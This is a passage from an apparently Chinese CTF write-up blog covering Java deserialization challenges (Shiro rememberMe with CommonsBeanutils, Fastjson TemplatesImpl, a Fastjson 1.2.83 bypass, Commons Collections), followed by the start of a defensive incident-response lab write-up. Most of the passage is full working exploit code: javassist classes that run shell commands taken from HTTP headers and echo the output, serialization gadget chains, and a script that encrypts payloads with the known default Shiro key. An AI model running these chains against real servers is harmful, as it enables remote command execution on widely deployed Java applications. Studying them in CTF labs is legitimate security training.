org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot;\\n&quot; + &quot; String te = httprequest.getHeader(\\&quot;Host\\&quot;);\\n&quot; + &quot; httpresponse.addHeader(\\&quot;Host\\&quot;, te);\\n&quot; + &quot; String tc = httprequest.getHeader(\\&quot;CMD\\&quot;);\\n&quot; + &quot; if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;cmd.exe\\&quot;, \\&quot;/c\\&quot;, tc&#125;; \\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot;\\n&quot; + &quot; &#125;\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125; catch (Exception e) &#123;\\n&quot; + &quot; e.getStackTrace();\\n&quot; + &quot; &#125;\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public CtClass genPayloadForLinux() throws NotFoundException, CannotCompileException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;Exp&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public SpringEcho() throws Exception &#123;\\n&quot; + &quot; try &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot;\\n&quot; + &quot; String te = httprequest.getHeader(\\&quot;Host\\&quot;);\\n&quot; + &quot; httpresponse.addHeader(\\&quot;Host\\&quot;, te);\\n&quot; + &quot; String tc = httprequest.getHeader(\\&quot;CMD\\&quot;);\\n&quot; + &quot; if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;/bin/sh\\&quot;, \\&quot;-c\\&quot;, tc&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot;\\n&quot; + &quot; &#125;\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125;&#125; 然后是纯CB依赖的链子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.CtClass;import org.apache.commons.beanutils.BeanComparator;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3public class POC &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); // ================== // 生成序列化字符串 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(queue); &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; DynamicClassGenerator classGenerator =new DynamicClassGenerator(); CtClass clz = classGenerator.genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; 因为懒得配shiro环境了，直接用之前的python脚本给AES加密了： 12345678910111213141516171819import uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) #密钥 iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 以上的流程走完我们就可以直接打了，因为是动态的，所以直接从HTTP header中添加CMD然后命令执行就好了 上边的流程走完，我们会发现rememberMe的长度在3300以内，当然是符合题目要求的，然而， 我们还可以对链子再次缩减（这里偷学p0lar1ght师傅的博客rwctf_Old-shiro题解 | P0l@R19ht (p0lar1ght.github.io)），缩减后的链子长度大约在2800以内 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.beanutils.BeanComparator;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class POC_short &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); // ================== // 生成序列化字符串 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(queue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; 我们来对比一下缩减前后的差距，其实和上边比起来就是少了个类的引用，但和正常的继承AbstractTranslet类的比起来，少了很多类的引用（正常继承会强制重写一些方法导致增加字符） 虽然这个payload短了不少，但拿去打上边那个叫CB链的题是不行的，因为打完链子就直接报500错误了，看不到回显，如果再添上内存马，那么payload又长了，还是不行的 PolarOA2.0这个题是上边那个题的升级版，密钥不再是默认的那个了，下边有两种方法来获取密钥，我们都来看一看 方法一：直接爆破常见密钥 不过这里有个问题，那就是不知道shiro的版本，shiro在1.4.2版本之后增加了AES GCM加密，因此不确定应不应该勾选，那就先都爆破一遍看看 （这里很奇怪，之前我打开的时候，确实是上边爆破出来了的，但之后直到爆破结束也没爆破出来，可能之前是误报，因为出题人也说这题是爆不出来的，那我们就直接看下边这种方法了） 方法二：爆破用户名和密码 直接弱口令admin:admin123登录 特性：Shiro大于1.2.4的版本中，在没有开发人员人工干预的情况下key改为了随机生成，这个随机生成是在每次启动Web环境的时候，重启前这个key不会改变，可以在JVM虚拟机内存里找到，而Spring的heapdump文件就是从JVM虚拟机内存导出的。 因此我们可以尝试从/actuator/heapdump看看有没有文件泄露，结果发现还真有，那就下载下来分析一波： 除此之外，发现直接读/actuator/env就能发现flag： 尝试交了一遍发现是个假flag。。。。那就只能继续往下做了，先验证一下key： 本题的key是FBLIB5s/7pnNDrYGF3+1og==，当然肯定是每个容器都不一样，还是自己尝试一下吧 之后出题人说要用payload在3000以内的，那我们就直接把上边PolarOA那个缩短版拿过来就好了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.CodecSupport;import org.apache.shiro.crypto.AesCipherService;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class POC_aesgcm_short &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(&quot;HeWlhWC2OauL4D1HjGqHDw==&quot;));//shiro密钥 byte[] bytes = byteArrayOutputStream.toByteArray(); System.out.println(aes.encrypt(bytes, key)); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; 但这里再往后就牵扯到一个版本问题了，从/actuator/logfile能够发现其shiro版本为1.8.0： 除此之外我们还需要知道CB依赖的版本，不然就会报错，经过搜索shiro1.8.0对应的CB依赖版本是1.9.4，然后打就完了： （本题我在网上看了看，除了出题人的WP之外就没有了，里边写的时候也没提到版本问题，当时做的时候就卡在这里动不了了，还好想起来了版本的事情…） Fastjson打开题目一看是这个： 看一下源码： 再看一下fastjson的版本： 看起来就一个简单的fastjson漏洞的利用，连个过滤都没有，因为题目不出网，我们用TemplatesImpl打就完了： 123456789101112131415161718192021222324252627282930313233343536373839404142package fastjson;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123; CtClass clz = genPayloadForLinux(); String byteCode = java.util.Base64.getEncoder().encodeToString(clz.toBytecode()); //构造TemplatesImpl的json数据，并将恶意类注入到json数据中 final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125;&#125; 直接命令执行读flag： ezJson源码看一下： 再看看依赖： 看起来能直接打fastjson1.2.83高版本绕过： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980package fastjson;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, null); return obj; &#125; public static void main(String[] args) throws Exception&#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setFieldValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; 打就完了 CC链 直接打CC链就行了，下边是CC3、CC6和CC2的集合（我直接打CC3或者CC2打不通）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;bbb&quot;); innerMap.remove(templates); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(innerMap,invokerTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize)); &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // 兼容低版本jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125;&#125; FastJsonBCEL","categories":[],"tags":[]},{"title":"应急响应靶场训练WP","slug":"应急响应靶场训练WP","date":"2024-05-28T03:44:27.530Z","updated":"2024-05-30T03:31:26.164Z","comments":true,"path":"2024/05/28/应急响应靶场训练WP/","link":"","permalink":"http://example.com/2024/05/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83WP/","excerpt":"作者：Narcher 时间：2024&#x2F;5&#x2F;28 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;5&#x2F;28 分类：writeup 前言自己这一块一直是个缺口，虽说靶场针对的事件不是很全，但也算能查漏补缺一部分了 正文应急响应靶机–Linux(1)挑战内容前景需要：小王急匆匆地找到小张，小王说“李哥，我dev服务器被黑了”，快救救我！！ 挑战内容： 黑客的IP地址 遗留下的三个flag 凭据：root&#x2F;defend defend&#x2F;defend 解题1.查看当前主机最近的用户登录情况： 1sudo grep &quot;Accepted&quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 可见之前有一个以root身份登录的ip，此为黑客的ip地址 2.进入root权限，sudo -s 查看历史命令history，发现第一个flag： 从黑客执行的历史命令中我们可以看出黑客更改了rc.local文件，我们直接cat查看具体内容： 获取到第二个flag 3.此时，黑客以及完成了root权限的获取以及权限维持的操作，基本上就结束了，我们去看看黑客是怎么打进来的 在cat /etc/passwd的时候发现存在redis服务，猜测存在redis未授权漏洞，我们来测试一下： 可见开启服务后直接登录成功，我们去查看redis配置文件，cat /etc/redis.conf： 获取到第三个flag 或者我们还能去查看一下历史修改的文件，rpm -Vf /usr/bin/*（感觉这个命令很有用）： 从上边也能看到黑客曾经修改过的文件 到了这步并未结束，我们还可以通过redis的连接日志去反推黑客的ip地址，先查看一下redis日志文件等级： 发现为verbose，那么就会包含着请求和响应的内容，黑客从这里打进来就必然会有记录 我们去查看redis的日志文件 发现黑客ip为192.168.75.129 到了这一步，这个靶机就基本上结束了 应急响应靶机–Linux(2)挑战内容前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！ 挑战内容： 1,提交攻击者IP 2,提交攻击者修改的管理员密码(明文) 3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg) 3,提交Webshell连接密码 4,提交数据包的flag1 5,提交攻击者使用的后续上传的木马文件名称 6,提交攻击者隐藏的flag2 7,提交攻击者隐藏的flag3 凭据：root&#x2F;Inch@957821. （注意密码第一个字符为大写的i） 解题因为涉及宝塔的编码问题，而靶机正好开放了22端口，我就直接用ssh连接了 1.首先去查看当前主机的用户登录情况： 1sudo grep &quot;Accepted&quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 192.168.58.1是我本机ip，那么192.168.20.1就是黑客的ip了 或者直接登录宝塔，查看日志： 2.至于攻击者修改的管理员密码(明文)，我们去查看一下&#x2F;etc&#x2F;passwd： 可见存在mysql服务，再去看看系统中所有TCP和UDP协议的监听端口以及这些端口上活动的连接和相关程序的信息： 那么管理员的密码（明文）差不多就是mysql数据库里的密码，并且需要md5解密 